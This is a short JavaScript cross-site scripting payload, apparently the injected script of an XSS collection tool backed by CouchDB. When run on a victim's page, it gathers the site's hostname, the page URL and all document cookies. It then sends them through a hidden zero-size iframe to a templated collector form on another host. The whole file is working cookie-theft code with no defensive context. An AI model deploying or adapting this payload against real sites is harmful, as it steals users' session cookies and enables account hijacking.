
(function(xssinjected) {
    if(xssinjected || location.hostname == 'localhost') return;
    
    window.xssinjected = 1;

    var cookies = (document.cookie || "");
    cookies = cookies.length > 0 ? cookies.split(';') : []
    
    var query = ["host=" + location.hostname,"url=" + location.href];
    for(var i=0; i<cookies.length; i++)
        query.push("cookie=" + cookies[i]);
    
    var create = function(name) { return document.createElement(name); };
    var append = function(el) { return document.body.appendChild(el); };
    
    var frame = create("iframe");
    //<iframe src="http://localhost:5984/xss/_design/api/_rewrite/form.html" style="width:620px;height:820px;-moz-border-radius:15px;border:1px solid #bbb;;margin:0;padding:0;" />
    frame.setAttribute('style', 'width:0;height:0;border:0;margin:0;padding:0;'); 
    frame.setAttribute('src', "{{form_html}}?" + query.join('&'));

    append(frame);
})(window.xssinjected);

